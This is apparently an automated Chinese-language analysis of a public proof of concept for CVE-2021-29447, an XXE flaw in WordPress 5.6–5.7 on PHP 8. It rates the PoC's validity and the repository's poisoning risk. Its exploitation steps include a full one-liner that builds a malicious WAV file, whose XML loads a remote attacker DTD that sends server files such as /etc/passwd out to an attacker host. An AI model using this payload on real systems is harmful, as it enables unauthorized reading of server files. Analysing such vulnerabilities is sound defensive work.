## CVE-2021-29447 - WordPress XXE

**漏洞编号:** CVE-2021-29447

**漏洞类型:** XML 外部实体注入 (XXE)

**影响应用:** WordPress

**危害等级:** 高危，可能导致敏感文件泄露

**影响版本:** >= 5.6.0, < 5.7.1 (PHP 8)

**利用条件:** 需要作者级别或以上权限，且WordPress运行在PHP 8环境下

**POC 可用性:** 是

**投毒风险:** 10%

## 详情

CVE-2021-29447 是一个存在于 WordPress 5.6.0 到 5.7.1 版本的 XXE 漏洞。该漏洞允许具有文件上传权限的用户（如作者）通过上传包含恶意 XML 的媒体文件来读取服务器上的敏感文件。该漏洞仅影响运行在 PHP 8 环境下的 WordPress 安装。

**有效性分析：**
提供的 POC 代码是有效的，它演示了如何利用该漏洞。利用方式是通过上传一个特制的 WAV 文件，该文件包含指向外部恶意的 DTD 文件的 XML 实体声明。当 WordPress 解析该文件时，会尝试从攻击者控制的服务器加载 DTD 文件，并执行其中定义的 XML 实体，从而导致 XXE 漏洞。

**投毒风险分析：**
代码仓库中可能存在的投毒风险较低，约为10%。 主要的攻击逻辑集中在 `attacker/www/evil.dtd` 文件中，该文件定义了如何利用 XXE 漏洞读取文件内容。`attacker/malicious_wav/index.js` 用于生成包含恶意 XML 的 WAV 文件。虽然攻击者可以修改这些文件以执行恶意操作，但这些修改会很容易被发现，因此，总体投毒风险较低。`decryption.php` 文件是空的，没有投毒代码.

**利用方式：**
1.  **环境搭建:** 使用 `docker-compose up` 启动包含 WordPress 和 MySQL 数据库的 Docker 容器。
2.  **攻击者服务器:** 启动一个简单的 PHP Web 服务器，用于托管恶意的 DTD 文件 (`evil.dtd`)。
3.  **生成恶意 WAV 文件:**  使用 `make make-wav` 或者 `echo -en 'RIFF\xb8\x00\x00\x00WAVEiXML\x7b\x00\x00\x00<?xml version="1.0"?><!DOCTYPE ANY[<!ENTITY % remote SYSTEM '\''http://host.docker.internal:8001/evil.dtd'\''>%remote;%init;%trick;] >\x00'> malicious.wav` 命令生成包含恶意 XML 声明的 WAV 文件。
4.  **登录 WordPress 并上传:**  以具有文件上传权限的用户身份登录 WordPress 后台，并将生成的恶意 WAV 文件上传到媒体库。
5.  **触发漏洞:**  上传后，WordPress 会尝试解析 WAV 文件，从而触发 XXE 漏洞，并向攻击者的服务器发送请求。
6.  **获取数据:** 攻击者的服务器会记录收到的请求，其中包含从 WordPress 服务器读取的敏感文件内容（如 `/etc/passwd` 文件）的 Base64 编码版本。可以通过运行`decryption.php` 来解码.

通过这种方式，攻击者可以在未经授权的情况下访问 WordPress 服务器上的敏感文件，从而可能导致更严重的攻击。

**项目地址:** [motikan2010/CVE-2021-29447](https://github.com/motikan2010/CVE-2021-29447)

**漏洞详情:** [CVE-2021-29447](https://nvd.nist.gov/vuln/detail/CVE-2021-29447)